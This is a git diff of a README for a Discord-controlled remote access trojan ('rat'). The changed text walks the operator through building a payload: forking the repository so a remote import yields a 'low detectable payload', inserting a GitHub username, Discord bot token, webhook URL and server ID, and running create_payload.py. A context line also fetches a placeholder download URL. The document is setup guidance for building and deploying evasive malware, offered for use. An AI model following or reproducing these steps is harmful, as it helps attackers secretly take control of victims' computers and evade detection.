@@ -21,7 +21,7 @@
 - [:white_check_mark:・Requirements](#requirements)
 - [:file_folder:・Getting Started](#gettingstarted)
 - [:pushpin:・Todo/Enhancements](#enhancements)
-- [:thought_balloon:・ChangeLog](#changelog)
+- [:thought_balloon:・Change Log](#changelog)
 - [:hammer_and_wrench:・Custom Commands](#customcommands)
 - [👤・Author](#author)
 - [🤝・Contributing](#contributing)
@@ -106,22 +106,29 @@ Before starting :checkered_flag:, you are required to have [Python 3.9.7](https:
 
 Below is how to setup and create a payload.
 
-1. Download or clone the repository
+1. Fork the repository, make sure to keep the repository name the same.
 
-2. Enter your Discord Bot Token in `payload.py`
+> (If you do not fork the repository, you will not be able to create a low detectable payload since the remote import will fail.)
+
+2. Replace `GITHUB_USERNAME_HERE` with your GitHub username in `payload.py`
+```python
+Github_username = "GITHUB_USERNAME_HERE"
+```
+
+3. Replace `DISCORD_TOKEN_HERE` with your Discord Bot Token in `payload.py`
 ```python
 rat.token_set("DISCORD_TOKEN_HERE")
 ```
 
-3. Enter your Discord Server ID & Webhook URL in `rat.py`
+4. Replace `DISCORD_WEBHOOK_URL` with your Webhook URL & replace `DISCORD_SERVER_ID` with your discord server id `rat.py`
 ```python
 api = 'DISCORD_WEBHOOK_URL'
 server_id = "DISCORD_SERVER_ID"
 ```
 
-4. Run `create_payload.py`
+5. Run `create_payload.py`
 
-5. Wait for the payload to be created
+6. Wait for the payload to be created
 
 
 ### Optional ###
@@ -164,7 +171,7 @@ r = requests.get("DOWNLOAD_URL_HERE", allow_redirects=False)
 
 
 
-## <a id="changelog"></a>:thought_balloon: 〢 ChangeLog ##
+## <a id="changelog"></a>:thought_balloon: 〢 Change Log ##
 
 ```diff
 v5.0.4 ⋮ 2022-07-24
